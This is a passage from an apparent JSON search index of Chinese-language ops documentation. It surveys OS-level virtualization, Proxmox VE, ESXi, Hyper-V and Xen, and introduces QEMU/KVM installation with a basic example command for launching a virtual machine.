virtualization\uff09\u200b\u4e2d\u200b\uff0c\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u5bf9\u8c61\u200b\u662f\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u53ca\u5176\u200b\u8c03\u5ea6\u200b\u7684\u200b\u7cfb\u7edf\u8d44\u6e90\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u50cf\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u90a3\u6837\u200b\u76f4\u63a5\u200b\u5bf9\u200b\u786c\u4ef6\u8d44\u6e90\u200b\u8fdb\u884c\u200b\u865a\u62df\u5316\u200b\u3002\u200b\u6bcf\u4e2a\u200b\u865a\u62df\u5316\u200b\u5b9e\u4f8b\u200b\u90fd\u200b\u8ba4\u4e3a\u200b\u81ea\u5df1\u200b\u72ec\u5360\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u53ca\u5176\u200b\u6240\u200b\u8c03\u5ea6\u200b\u7684\u200b\u8d44\u6e90\u200b\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u865a\u62df\u5316\u200b\u5b9e\u4f8b\u200b\u662f\u200b\u5171\u4eab\u200b\u5185\u6838\u200b\u8d44\u6e90\u200b\u7684\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4ecd\u200b\u53d7\u5230\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u7684\u200b\u8c03\u5ea6\u200b\u4e0e\u200b\u9650\u5236\u200b\u3002</p> <p>\u200b\u8fd9\u200b\u4e00\u7c7b\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u4e00\u822c\u200b\u4f9d\u8d56\u4e8e\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u63d0\u4f9b\u200b\u7684\u200b\u9694\u79bb\u200b\u4e0e\u200b\u8d44\u6e90\u200b\u9650\u5236\u200b\u529f\u80fd\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0cFreeBSD \u200b\u5185\u6838\u200b\u63d0\u4f9b\u200b\u7684\u200b\u4e3b\u8981\u200b\u673a\u5236\u200b\u88ab\u200b\u79f0\u4e3a\u200b jail\uff0c\u200b\u4ee5\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u7684\u200b\u5f62\u5f0f\u200b\u63d0\u4f9b\u200b\u4f7f\u7528\u200b\u63a5\u53e3\u200b\uff0c\u200b\u7528\u4e8e\u200b\u521b\u5efa\u200b\u591a\u4e2a\u200b\u9694\u79bb\u200b\u7684\u200b\u7528\u6237\u200b\u73af\u5883\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\uff1b\u200b\u800c\u200b Linux \u200b\u5185\u6838\u200b\u63d0\u4f9b\u200b\u7684\u200b\u673a\u5236\u200b\u6bd4\u8f83\u200b\u591a\u6837\u5316\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <ul> <li>namespaces\uff1a\u200b\u5c06\u200b\u5168\u5c40\u200b\u7cfb\u7edf\u8d44\u6e90\u200b\uff08PID\u3001\u200b\u7f51\u7edc\u200b\u3001\u200b\u6302\u8f7d\u200b\u70b9\u200b\u7b49\u200b\uff09\u200b\u9694\u79bb\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u547d\u540d\u200b\u7a7a\u95f4\u200b\u4e2d\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u6bcf\u4e2a\u200b\u8fdb\u7a0b\u200b\u7ec4\u200b\u62e5\u6709\u200b\u72ec\u7acb\u200b\u7684\u200b\u8d44\u6e90\u200b\u89c6\u56fe\u200b</li> <li>cgroups\uff1a\u200b\u5bf9\u200b\u8fdb\u7a0b\u200b\u7ec4\u200b\u7684\u200b\u4f7f\u7528\u200b\u7684\u200b\u786c\u4ef6\u8d44\u6e90\u200b\uff08CPU\u3001\u200b\u5185\u5b58\u200b\u3001\u200b\u78c1\u76d8\u200b I/O \u200b\u7b49\u200b\uff09\u200b\u8fdb\u884c\u200b\u9650\u5236\u200b\u3001\u200b\u76d1\u63a7\u200b\u548c\u200b\u7ba1\u7406\u200b</li> <li>seccomp\uff1a\u200b\u9650\u5236\u200b\u8fdb\u7a0b\u200b\u6240\u200b\u80fd\u591f\u200b\u4f7f\u7528\u200b\u7684\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b</li> </ul> <p>\u200b\u76ee\u524d\u200b\u6d41\u884c\u200b\u7684\u200b\u3001\u200b\u751f\u6001\u200b\u8f83\u200b\u597d\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u88ab\u200b\u79f0\u4e3a\u200b\u5bb9\u5668\u200b\uff08Containers\uff09\uff0c\u200b\u6211\u4eec\u200b\u5e38\u7528\u200b\u7684\u200b Docker \u200b\u5c31\u200b\u5c5e\u4e8e\u200b\u4e00\u79cd\u200b\u5bb9\u5668\u200b\u5b9e\u73b0\u200b\u3002\u200b\u4e0e\u200b FreeBSD jail \u200b\u76f8\u6bd4\u200b\uff0c\u200b\u5bb9\u5668\u200b\u6280\u672f\u200b\u6ce8\u91cd\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u53ef\u200b\u5206\u53d1\u200b\u6027\u200b\uff0c\u200b\u5728\u200b DevOps \u200b\u9886\u57df\u200b\u4e2d\u200b\u5f97\u5230\u200b\u4e86\u200b\u5e7f\u6cdb\u200b\u4f7f\u7528\u200b\uff1b\u200b\u5f53\u7136\u200b\uff0c\u200b\u53ea\u8981\u200b\u914d\u7f6e\u200b\u5f97\u5f53\u200b\uff0c\u200b\u5bb9\u5668\u200b\u540c\u6837\u200b\u4e5f\u200b\u80fd\u200b\u5b9e\u73b0\u200b\u8f83\u4e3a\u200b\u53ef\u9760\u200b\u7684\u200b\u5b89\u5168\u200b\u9694\u79bb\u200b\u4f5c\u7528\u200b\u3002\u200b\u5173\u4e8e\u200b\u5bb9\u5668\u200b\u6280\u672f\u200b\u7684\u200b\u8be6\u7ec6\u200b\u4ecb\u7ecd\u200b\uff0c\u200b\u8bf7\u200b\u53c2\u8003\u200b\u672c\u200b\u6587\u6863\u200b\u7684\u200b \u200b\u5bb9\u5668\u200b \u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u4e0e\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u76f8\u6bd4\u200b\uff0c\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7ea7\u200b\u865a\u62df\u5316\u200b\u7684\u200b\u5f00\u9500\u200b\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u200b\u4f9d\u8d56\u4e8e\u200b\u786c\u4ef6\u200b\u652f\u6301\u200b\uff0c\u200b\u4f46\u200b\u53d7\u5230\u200b\u5b9e\u73b0\u200b\u539f\u7406\u200b\u7684\u200b\u9650\u5236\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u8fd0\u884c\u200b\u4e0d\u540c\u200b\u5185\u6838\u200b\u7684\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u3002</p>"},{"location":"ops/virtualization/intro/#_10","title":"\u5e38\u89c1\u200b\u670d\u52a1\u5668\u200b\u865a\u62df\u5316\u200b\u65b9\u6848","text":""},{"location":"ops/virtualization/intro/#proxmox-ve-pve","title":"Proxmox VE (PVE)","text":"<p>Proxmox Virtual Environment\uff08\u200b\u7b80\u79f0\u200b Proxmox VE\u3001PVE\uff09\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5f00\u6e90\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u865a\u62df\u5316\u200b\u73af\u5883\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u3002\u200b\u5176\u200b\u4f7f\u7528\u200b\u57fa\u4e8e\u200b Ubuntu \u200b\u7684\u200b\u5b9a\u5236\u200b\u5185\u6838\u200b\uff0c\u200b\u5305\u542b\u200b\u5b89\u88c5\u7a0b\u5e8f\u200b\u3001\u200b\u7f51\u9875\u200b\u63a7\u5236\u53f0\u200b\u548c\u200b\u547d\u4ee4\u884c\u200b\u5de5\u5177\u200b\uff0c\u200b\u5e76\u4e14\u200b\u63d0\u4f9b\u200b\u4e86\u200b REST API \u200b\u8fdb\u884c\u200b\u63a7\u5236\u200b\u3002</p> <p>Proxmox VE \u200b\u652f\u6301\u200b\u4e24\u7c7b\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\uff1a\u200b\u57fa\u4e8e\u200b\u5bb9\u5668\u200b\u7684\u200b LXC \u200b\u548c\u200b\u786c\u4ef6\u200b\u62bd\u8c61\u200b\u5c42\u5168\u200b\u865a\u62df\u5316\u200b\u7684\u200b KVM\u3002</p> <p></p> <p></p>"},{"location":"ops/virtualization/intro/#vmware-esxi","title":"VMware ESXi","text":"<p>VMware ESXi\uff08\u200b\u7b80\u79f0\u200b ESXi\uff09\u200b\u662f\u200b\u7531\u200b VMware \u200b\u516c\u53f8\u200b\u5f00\u53d1\u200b\u7684\u200b\u4e00\u6b3e\u200b\u4f01\u4e1a\u7ea7\u200b Type-1 Hypervisor\uff0c\u200b\u5176\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u56fe\u5f62\u5316\u200b\u7ba1\u7406\u5de5\u5177\u200b\uff08Web UI\uff09\u3001\u200b\u547d\u4ee4\u884c\u200b\u63a5\u53e3\u200b\uff08ESXi Shell \u200b\u53ca\u200b\u914d\u5957\u200b\u5de5\u5177\u200b\uff09\u200b\u4ee5\u53ca\u200b API \u200b\u63a5\u53e3\u200b\uff0c\u200b\u4fbf\u4e8e\u200b\u7ba1\u7406\u5458\u200b\u8fdb\u884c\u200b\u865a\u62df\u673a\u200b\u7ba1\u7406\u200b\u548c\u200b\u81ea\u52a8\u5316\u200b\u8fd0\u7ef4\u200b\u3002</p> <p>ESXi \u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u4e0e\u200b VMware vSphere \u200b\u5957\u4ef6\u200b\u96c6\u6210\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u5982\u70ed\u200b\u8fc1\u79fb\u200b\uff08vMotion\uff09\u3001\u200b\u9ad8\u53ef\u7528\u6027\u200b\uff08HA\uff09\u200b\u7b49\u200b\u9ad8\u7ea7\u200b\u529f\u80fd\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0cESXi \u200b\u53ca\u200b vSphere \u200b\u662f\u200b\u95ed\u6e90\u200b\u7684\u200b\u4ed8\u8d39\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4ece\u200b 2024 \u200b\u5e74\u200b\u5f00\u59cb\u200b\u4e0d\u518d\u200b\u63d0\u4f9b\u200b\u514d\u8d39\u200b\u7248\u672c\u200b\u3002</p> <p></p> <p></p>"},{"location":"ops/virtualization/intro/#microsoft-hyper-v","title":"Microsoft Hyper-V","text":"<p>Microsoft Hyper-V\uff08\u200b\u7b80\u79f0\u200b Hyper-V\uff09\u200b\u662f\u200b\u5fae\u8f6f\u516c\u53f8\u200b\u5f00\u53d1\u200b\u7684\u200b\u4e00\u6b3e\u200b\u4f01\u4e1a\u7ea7\u200b\u865a\u62df\u5316\u200b\u5e73\u53f0\u200b\uff0c\u200b\u96c6\u6210\u200b\u4e8e\u200b Windows Server \u200b\u4e2d\u200b\uff0c\u200b\u540c\u65f6\u200b\u4e5f\u200b\u53ef\u200b\u7528\u4e8e\u200b Windows 10 Pro/Enterprise \u200b\u7248\u672c\u200b\u3002\u200b\u5b83\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u56fe\u5f62\u5316\u200b\u7ba1\u7406\u5de5\u5177\u200b Hyper-V Manager\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b PowerShell \u200b\u7b49\u200b\u547d\u4ee4\u884c\u200b\u63a5\u53e3\u200b\u8fdb\u884c\u200b\u7ba1\u7406\u200b\u3002</p> <p>Hyper-V \u200b\u652f\u6301\u200b\u52a8\u6001\u5185\u5b58\u200b\u7ba1\u7406\u200b\u3001\u200b\u865a\u62df\u673a\u200b\u5feb\u7167\u200b\u3001\u200b\u5b9e\u65f6\u200b\u8fc1\u79fb\u200b\uff08Live Migration\uff09\u200b\u548c\u200b\u590d\u5236\u200b\uff08Replica\uff09\u200b\u7b49\u200b\u9ad8\u7ea7\u200b\u529f\u80fd\u200b\uff0c\u200b\u540c\u65f6\u200b\u53ef\u4ee5\u200b\u4e0e\u200b System Center Virtual Machine Manager (SCVMM) \u200b\u96c6\u6210\u200b\uff0c\u200b\u8fdb\u4e00\u6b65\u63d0\u9ad8\u200b\u6570\u636e\u4e2d\u5fc3\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u7ba1\u7406\u6548\u7387\u200b\u3002</p> <p></p> <p></p>"},{"location":"ops/virtualization/intro/#xen","title":"Xen","text":"<p>Xen\uff08\u200b\u901a\u5e38\u200b\u79f0\u4e3a\u200b Xen Hypervisor \u200b\u6216\u200b Xen Project\uff09\u200b\u662f\u200b\u4e00\u6b3e\u200b\u5f00\u6e90\u200b\u514d\u8d39\u200b\u7684\u200b Type-1 Hypervisor\uff0c\u200b\u652f\u6301\u200b\u534a\u200b\u865a\u62df\u5316\u200b\uff08PV\uff09\u200b\u548c\u200b\u5b8c\u5168\u200b\u865a\u62df\u5316\u200b\uff08HVM\uff09\u200b\u6280\u672f\u200b\u3002\u200b\u5176\u200b\u6700\u521d\u200b\u4e8e\u200b 2003 \u200b\u5e74\u200b\u7531\u200b\u5251\u6865\u5927\u5b66\u200b\u8ba1\u7b97\u673a\u200b\u5b9e\u9a8c\u5ba4\u200b\u5f00\u53d1\u200b\uff0c\u200b\u76ee\u524d\u200b\u7531\u200b Linux Foundation \u200b\u5f00\u53d1\u200b\u4e0e\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e86\u200b Intel\u3001AMD\u3001Citrix\u3001AWS \u200b\u7b49\u200b\u5382\u5546\u200b\u7684\u200b\u5e7f\u6cdb\u652f\u6301\u200b\u3002</p> <p>Xen \u200b\u662f\u200b x86 \u200b\u534a\u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u7684\u200b\u5148\u9a71\u200b\uff0c\u200b\u5176\u200b\u7ecf\u5178\u200b\u8bba\u6587\u200b\u300aXen and the art of virtualization\u300b\u200b\u5bf9\u200b\u865a\u62df\u5316\u200b\u9886\u57df\u200b\u4ea7\u751f\u200b\u4e86\u200b\u6df1\u8fdc\u5f71\u54cd\u200b\uff1b\u200b\u540c\u65f6\u200b\uff0c\u200b\u5728\u200b KVM \u200b\u5c1a\u672a\u200b\u666e\u53ca\u200b\u7684\u200b\u65e9\u671f\u200b\u9636\u6bb5\u200b\uff082015 \u200b\u5e74\u200b\u4ee5\u524d\u200b\uff09\uff0cXen \u200b\u662f\u200b\u4e91\u200b\u670d\u52a1\u200b\u5382\u5546\u200b\u548c\u200b\u5927\u578b\u200b\u6570\u636e\u4e2d\u5fc3\u200b\u7684\u200b\u4e3b\u6d41\u200b\u9009\u62e9\u200b\u3002</p> <p></p>"},{"location":"ops/virtualization/intro/#_11","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>\u200b\u963f\u91cc\u200b\u4e91\u200b\u8bfe\u7a0b\u200b - \u200b\u865a\u62df\u5316\u200b\u6280\u672f\u200b\u5165\u95e8\u200b</li> <li>CTF Wiki - \u200b\u865a\u62df\u5316\u200b\u57fa\u7840\u77e5\u8bc6\u200b</li> <li>VMware White Paper - Understanding Full Virtualization, Paravirtualization, and Hardware Assist</li> <li>Intel\u00ae 64 and IA-32 Architectures Software Developer\u2019s Manual Volume 3C: System Programming Guide, Part 3</li> <li>Virtio: An I/O virtualization framework for Linux</li> <li>Intel\u00ae Virtualization Technology for Directed I/O</li> <li>Xen Project Software Overview</li> <li>Edouard Bugnion, Scott Devine, Mendel Rosenblum, Jeremy Sugerman, and Edward Y. Wang. 2012. Bringing Virtualization to the x86 Architecture with the Original VMware Workstation. ACM Trans. Comput. Syst. 30, 4, Article 12 (November 2012), 51 pages. https://doi.org/10.1145/2382553.2382554</li> <li>Paul Barham, Boris Dragovic, Keir Fraser, Steven Hand, Tim Harris, Alex Ho, Rolf Neugebauer, Ian Pratt, and Andrew Warfield. 2003. Xen and the art of virtualization. SIGOPS Oper. Syst. Rev. 37, 5 (December 2003), 164\u2013177. https://doi.org/10.1145/1165389.945462</li> </ul>"},{"location":"ops/virtualization/qemu-kvm/","title":"QEMU/KVM","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@RTXUX</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>QEMU/KVM \u200b\u662f\u200b Linux \u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u5e38\u7528\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u65b9\u6848\u200b\u3002\u200b\u5176\u200b\u5206\u4e3a\u200b\u8fd0\u884c\u200b\u5728\u200b\u7528\u6237\u200b\u7a7a\u95f4\u200b\u7684\u200b QEMU \u200b\u548c\u200b\u8fd0\u884c\u200b\u5728\u200b\u5185\u6838\u200b\u7a7a\u95f4\u200b\u7684\u200b KVM \u200b\u4e24\u200b\u90e8\u5206\u200b\u3002QEMU \u200b\u8d1f\u8d23\u200b\u6a21\u62df\u200b\u786c\u4ef6\u200b\uff0cKVM \u200b\u5219\u200b\u8d1f\u8d23\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u8fd0\u884c\u200b\u3002</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u5c06\u200b\u5bf9\u200b QEMU \u200b\u548c\u200b KVM \u200b\u57fa\u7840\u77e5\u8bc6\u200b\u548c\u200b\u57fa\u672c\u64cd\u4f5c\u200b\u8fdb\u884c\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_1","title":"\u7ec4\u4ef6\u200b\u4ecb\u7ecd","text":""},{"location":"ops/virtualization/qemu-kvm/#qemu","title":"QEMU","text":"<p>QEMU\uff08Quick Emulator\uff09\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5f00\u6e90\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u5b83\u200b\u901a\u8fc7\u200b\u52a8\u6001\u200b\u4e8c\u8fdb\u5236\u200b\u7ffb\u8bd1\u200b\u6765\u200b\u6a21\u62df\u200b CPU\uff0c\u200b\u5e76\u200b\u63d0\u4f9b\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u786c\u4ef6\u200b\u6a21\u578b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6a21\u62df\u200b\u591a\u79cd\u200b\u5916\u8bbe\u200b\u786c\u4ef6\u200b\u3002QEMU \u200b\u53ef\u4ee5\u200b\u5728\u200b\u6ca1\u6709\u200b\u786c\u4ef6\u52a0\u901f\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u72ec\u7acb\u200b\u8fd0\u884c\u200b\uff0c\u200b\u4f46\u200b\u8fd9\u6837\u200b\u5176\u4e2d\u200b\u7684\u200b CPU \u200b\u90e8\u5206\u200b\u662f\u200b\u6a21\u62df\u200b\u6307\u4ee4\u200b\u7684\u200b\u6267\u884c\u200b\uff0c\u200b\u6027\u80fd\u200b\u4f4e\u4e0b\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b QEMU \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ec5\u200b\u7528\u4e8e\u200b CPU \u200b\u6307\u4ee4\u200b\u548c\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u7684\u200b\u7ffb\u8bd1\u200b\uff0c\u200b\u4e0d\u200b\u6a21\u62df\u200b\u786c\u4ef6\u200b\u6a21\u578b\u200b\uff0c\u200b\u8fd9\u79cd\u200b\u6a21\u5f0f\u200b\u79f0\u4e3a\u200b User Mode\u3002\u200b\u4e3b\u8981\u200b\u7528\u4e8e\u200b\u8fd0\u884c\u200b\u4e0d\u540c\u4e8e\u200b\u5bbf\u4e3b\u200b\u7cfb\u7edf\u200b CPU \u200b\u6307\u4ee4\u96c6\u200b\u7684\u200b\u7528\u6237\u200b\u6001\u200b\u4e8c\u8fdb\u5236\u200b\u7a0b\u5e8f\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#kvm","title":"KVM","text":"<p>KVM\uff08Kernel-based Virtual Machine\uff09\u200b\u662f\u200b\u4e00\u79cd\u200b\u57fa\u4e8e\u200b Linux \u200b\u5185\u6838\u200b\u7684\u200b\u5f00\u6e90\u200b\u865a\u62df\u5316\u200b\u89e3\u51b3\u65b9\u6848\u200b\u3002KVM \u200b\u5c06\u200b Linux \u200b\u8f6c\u53d8\u6210\u200b\u4e00\u4e2a\u200b\u865a\u62df\u673a\u200b\u76d1\u89c6\u5668\u200b\uff08Hypervisor\uff09\u3002\u200b\u5b83\u200b\u5229\u7528\u200b\u4e86\u200b\u73b0\u4ee3\u200b\u5904\u7406\u5668\u200b\u4e2d\u200b\u7684\u200b\u786c\u4ef6\u200b\u865a\u62df\u5316\u200b\u652f\u6301\u200b\uff08\u200b\u4f8b\u5982\u200b Intel VT-x \u200b\u6216\u200b AMD-V\uff09\uff0c\u200b\u4ee5\u200b\u5b9e\u73b0\u200b\u9ad8\u6027\u80fd\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u3002\u200b\u5b83\u200b\u4e13\u6ce8\u200b\u4e8e\u200b\u4ee5\u200b\u6700\u5c0f\u200b\u7684\u200b\u5f00\u9500\u200b\u5728\u200b Linux \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u5b89\u5168\u200b\u548c\u200b\u9694\u79bb\u200b\u7684\u200b\u865a\u62df\u73af\u5883\u200b\uff0c\u200b\u540c\u65f6\u200b\u7ef4\u6301\u200b\u63a5\u8fd1\u200b\u539f\u751f\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u5b83\u200b\u5411\u200b\u7528\u6237\u200b\u7a7a\u95f4\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u865a\u62df\u200b CPU \u200b\u548c\u200b\u5185\u5b58\u200b\u5b50\u7cfb\u7edf\u200b\u7684\u200b\u914d\u7f6e\u200b\u548c\u200b\u6267\u884c\u200b\u63a7\u5236\u200b\u76f8\u5173\u200b\u63a5\u53e3\u200b\uff0c\u200b\u4f46\u200b KVM \u200b\u4e0d\u200b\u5305\u542b\u200b\u786c\u4ef6\u200b\u6a21\u578b\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u72ec\u7acb\u200b\u6784\u6210\u200b\u865a\u62df\u673a\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#qemukvm_1","title":"QEMU/KVM","text":"<p>QEMU \u200b\u4e0e\u200b KVM \u200b\u7684\u200b\u5173\u7cfb\u200b\u662f\u200b\u4e92\u8865\u200b\u7684\u200b\u3002\u200b\u5f53\u200b\u4e8c\u8005\u200b\u7ed3\u5408\u200b\u4f7f\u7528\u200b\u65f6\u200b\uff0cQEMU \u200b\u8d1f\u8d23\u200b\u63d0\u4f9b\u200b\u8f6f\u4ef6\u200b\u6a21\u62df\u200b\u548c\u200b\u7528\u6237\u754c\u9762\u200b\uff0c\u200b\u800c\u200b KVM \u200b\u5219\u200b\u5728\u200b\u5185\u6838\u200b\u7ea7\u522b\u200b\u63d0\u4f9b\u200b\u786c\u4ef6\u52a0\u901f\u200b\u652f\u6301\u200b\u3002\u200b\u8fd9\u79cd\u200b\u914d\u5408\u200b\u4f7f\u5f97\u200b\u865a\u62df\u673a\u200b\u80fd\u591f\u200b\u4ee5\u8f83\u200b\u4f4e\u200b\u7684\u200b\u6027\u80fd\u200b\u5f00\u9500\u200b\u8fd0\u884c\u200b\uff0c\u200b\u540c\u65f6\u200b\u7528\u6237\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u4eab\u53d7\u200b\u5230\u200b QEMU \u200b\u5728\u200b\u8bbe\u5907\u200b\u6a21\u62df\u200b\u65b9\u9762\u200b\u63d0\u4f9b\u200b\u7684\u200b\u7075\u6d3b\u6027\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0cQEMU \u200b\u901a\u5e38\u200b\u4f5c\u4e3a\u200b\u7528\u6237\u200b\u7a7a\u95f4\u200b\u7684\u200b\u5de5\u5177\u200b\u4e0e\u200b KVM \u200b\u7684\u200b\u5185\u6838\u200b\u865a\u62df\u5316\u200b\u529f\u80fd\u200b\u914d\u5408\u200b\uff0c\u200b\u4e00\u8d77\u200b\u5f62\u6210\u200b\u4e86\u200b\u73b0\u4ee3\u200b Linux \u200b\u73af\u5883\u200b\u4e2d\u200b\u5f3a\u5927\u200b\u7684\u200b\u865a\u62df\u5316\u200b\u89e3\u51b3\u65b9\u6848\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_2","title":"\u5b89\u88c5\u200b\u914d\u7f6e","text":"<p>\u200b\u73b0\u5728\u200b\u5927\u591a\u6570\u200b\u53d1\u884c\u7248\u200b\u63d0\u4f9b\u200b\u7684\u200b\u5185\u6838\u200b\u90fd\u200b\u5305\u542b\u200b KVM \u200b\u76f8\u5173\u200b\u6a21\u5757\u200b\uff0c\u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b QEMU \u200b\u7684\u200b\u4e8c\u8fdb\u5236\u200b\u5305\u200b\u3002\u200b\u56e0\u6b64\u200b\u5728\u200b\u5927\u591a\u6570\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cKVM \u200b\u65e0\u9700\u200b\u8fdb\u884c\u200b\u4efb\u4f55\u200b\u914d\u7f6e\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b QEMU \u200b\u7684\u200b\u4e8c\u8fdb\u5236\u200b\u5305\u200b\u5373\u53ef\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u8fdb\u884c\u200b\u914d\u7f6e\u200b\uff0c\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\u53ef\u4ee5\u200b\u4f5c\u4e3a\u200b\u53c2\u8003\u200b\u3002</p> KVM <p>\u200b\u4ee5\u200b x86 \u200b\u4e3a\u4f8b\u200b\u3002</p> <ol> <li>\u200b\u786e\u4fdd\u200b\u5185\u6838\u200b\u914d\u7f6e\u200b\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b KVM \u200b\u76f8\u5173\u200b\u6a21\u5757\u200b\u3002\u200b\u9700\u8981\u200b\u7684\u200b\u914d\u7f6e\u200b\u9879\u200b\u5305\u62ec\u200b\uff1a<ul> <li><code>CONFIG_KVM</code></li> <li><code>CONFIG_KVM_INTEL</code> \u200b\u6216\u200b <code>CONFIG_KVM_AMD</code></li> <li>EPT \u200b\u652f\u6301\u200b\u7b49\u200b\u6a21\u5757\u200b</li> </ul> </li> <li>\u200b\u52a0\u8f7d\u200b KVM \u200b\u6a21\u5757\u200b\uff1a<code>modprobe kvm_intel</code> \u200b\u6216\u200b <code>modprobe kvm_amd</code>\u3002</li> <li>\u200b\u6b63\u786e\u200b\u914d\u7f6e\u200b <code>/dev/kvm</code> \u200b\u5b57\u7b26\u200b\u8bbe\u5907\u200b\u7684\u200b\u6743\u9650\u200b\uff0c\u200b\u4f7f\u200b\u9700\u8981\u200b\u8fd0\u884c\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u8bbf\u95ee\u200b\u8be5\u200b\u8bbe\u5907\u200b\u3002</li> </ol> QEMU <p>\u200b\u53ea\u200b\u9700\u200b\u5b89\u88c5\u200b QEMU \u200b\u7684\u200b\u4e8c\u8fdb\u5236\u200b\u5305\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u53d1\u884c\u7248\u200b\u4e0d\u200b\u63d0\u4f9b\u200b\u76f8\u5173\u200b\u5305\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4ece\u200b QEMU \u200b\u5b98\u7f51\u200b \u200b\u4e0b\u8f7d\u200b\u6e90\u7801\u200b\u7f16\u8bd1\u200b\u5b89\u88c5\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_3","title":"\u7b2c\u4e00\u53f0\u200b\u865a\u62df\u673a","text":"<p>\u200b\u4ee5\u4e0b\u200b\u5b9e\u4f8b\u200b\u547d\u4ee4\u200b\u7528\u4e8e\u200b\u542f\u52a8\u200b\u4e00\u4e2a\u200b\u4f7f\u7528\u200b KVM, \u200b\u5e26\u6709\u200b\u53cc\u6838\u200b CPU\uff0c1GB \u200b\u5185\u5b58\u200b\uff0c\u200b\u4f7f\u7528\u200b\u4e00\u4e2a\u200b\u540d\u4e3a\u200b <code>example.img</code> \u200b\u7684\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u200b\u548c\u200b\u7528\u6237\u200b\u6001\u200b\u7f51\u7edc\u200b\u7684\u200b\u865a\u62df\u673a\u200b\u3002</p> <pre><code>qemu-system-x86_64 \\\n    -enable-kvm \\\n    -m 1024 \\\n    -cpu host \\\n    -smp cores=2 \\\n    -drive file=example.img,format=raw,if=virtio \\\n    -nic user,model=virtio\n</code></pre> 